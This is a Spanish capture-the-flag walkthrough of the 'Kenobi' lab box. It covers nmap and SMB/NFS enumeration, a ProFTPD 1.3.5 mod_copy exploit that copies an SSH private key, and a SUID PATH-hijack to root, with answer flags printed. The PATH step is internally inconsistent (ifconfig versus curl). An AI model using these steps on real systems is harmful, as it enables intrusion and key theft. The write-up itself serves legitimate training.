# Kenobi module

Modulo para probar algunas tecnicas de vulneracion de SAMBA, FTP, Acceder y manipular rutas

## Vector de ataque

En esencia el vector de ataque es el siguiente:

1. Reconocimiento
2. Vulnerar SAMBA
3. Vulnerar ProFTPD
4. Escalar privilegios

## 1. Reconocimiento

Mapeamos el servidor vulnerable
```
nmap 10.10.103.161
```
Respuesta
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 09:15 EDT
Nmap scan report for 10.10.103.161
Host is up (0.35s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 89.27 seconds
```
Scan the machine with nmap, how many ports are open?: **7**

## 2. Vulnerar SAMBA

Podemos enumerar las carpetas compartidas por SAMBA, podemos usar los scripts enum shares y enum users para esto

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.103.161
```

Respuesta
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 09:18 EDT
Nmap scan report for 10.10.103.161
Host is up (0.34s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.103.161\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.103.161\anonymous: 
|     warning: Couldn't get details for share: SMB: Failed to receive bytes: TIMEOUT
|     Type: Not a file share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.103.161\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 94.69 seconds

```

Si analizamos la respuesta veremos que tenemos 3 usuarios disponibles:
* IPC
* anonymous
* print

Using the nmap command above, how many shares have been found? **3**

IPC tiene accesos lectura/escritura en /tmp y anonymous tiene permisos de lectura y escritura en su carpeta.

Se nos pide inspeccionar las carpetas compartidas, para ello usaremos el usuario anonymous cuya contraseña es... "" (sin comillas).

```
smbclient //10.10.103.161/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> 

```

¿y que archivos podemos ver?

```
smb: \> dir
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877092 blocks available
```

Once you're connected, list the files on the share. What is the file can you see? **log.txt**

Tambien podemos descargar todo lo que tenga la carpeta compartida con el siguiente comando

```
smbget -R smb://10.10.103.161/anonymous
```

Se descargará el archivo log.txt, al inspeccionarlo podemos ver algunas cosas interesantes:

```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
...
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
...

# This is a basic ProFTPD configuration file (rename it to 
...

# Port 21 is the standard FTP port.
Port                            21

```
What port is FTP running on? **21**

Dentro de los puertos que scaneamos anteriormente, detectamos rpcbind (servicio que al iniciar un programa sirve para convertir llamadas de procedimientos a direcciones universales). En este caso accede al file system.

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.103.161
```

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 09:42 EDT
Nmap scan report for 10.10.103.161
Host is up (0.35s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds
```
What mount can we see? **/var**

## 3. Vulnerar ProFTPD

Anteriormente detectamos que existe un servidor ftp instalado, se nos pide ver la version con netcat
```
nc 10.10.103.161 21
```

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.103.161]
```

What is the version? **1.3.5**

Busquemos con searchsploit si existe alguna vulnerabilidad

```
searchsploit proftp 1.3.5
```

```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                                                            | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                                                  | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                                                              | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                                                                            | linux/remote/36742.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
How many exploits are there for the ProFTPd running? **4**

Uno de los exploits "mod_copy", es vulnerable a explotar  SITE CPFR and SITE CPTO (uno para copiar un archivo y el otro para pegarlo en una direccion de destino)

Anteriormente descubrimos donde está alojada la llave rsa de kenobi, explotemos la vulnerabilidad

Copiamos el archivo
```
SITE CPFR /home/kenobi/.ssh/id_rsa
```

```
350 File or directory exists, ready for destination name
```

Lo pegamos en la ruta expuesta
```
SITE CPTO /var/tmp/id_rsa
```

```
250 Copy successful
```
Con esto movimos la llave a la ruta expuesta por SAMBA

Montemos la ruta en nuestro equipo

```
sudo mkdir /mnt/kenobiNFS
sudo mount 10.10.103.161:/var /mnt/kenobiNFS
```

```
ls -la /mnt/kenobiNFS
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Aug 30 09:53 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Aug 30 09:51 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
```
Obtengamos la llave del usuario kenobi
```
sudo cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
sudo chown kali:kali id_rsa
```

Accedamos con nuestro nuevo usuario
```
ssh -i id_rsa -l kenobi 10.10.103.161
```

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 
```

What is Kenobi's user flag (/home/kenobi/user.txt)? **d0b0f3f53b6caa532a83915e19224899**

## 4. Escalar privilegios

Ya estamos en nuestra maquina con nuestro usuario kenobi, comienza la fase de escalamiento de privilegios. Para ello revisaremos si existe algun binario con SUID bit que nos permita explotarlo

```
 find / -perm -u=s -type f 2>/dev/null
```

```
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

De los binarios expuesto, hay uno en particular que llama la atencion, que no es parte de los tipicos binarios inexplotables.

What file looks particularly out of the ordinary? **/usr/bin/menu**

Si corremos el binario nos da 3 opciones
```
/usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :

```

Run the binary, how many options appear? **3**

Teniendo en cuenta la vulnerabilidad de SUID y viendo que lo que está ejecutando son comandos de sistema. Podemos abusar de la ruta en la que va a buscar esos binarios a traves de PATH. Asi haremos que vaya a buscar algun binario a una ruta X (tmp en este caso) y si lo encuentra, lo ejecute primero en el contexto SUID de root.

```
echo /bin/sh > ifconfig # creamos un binario curl que solo ejecute una shell
chmod 777 ifconfig # le damos permisos para todo 
mv curl /tmp # lo movemos a /tmp
export PATH=/tmp:$PATH # explotamos path para que vaya a buscar el binario a /tmp primero
```

```
kenobi@kenobi:~$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
# whoami
root
```

con eso escalamos a root


What is the root flag (/root/root.txt)? **177b3cd8562289f37382721c28381f02**

---
Happy exploiting - Zpx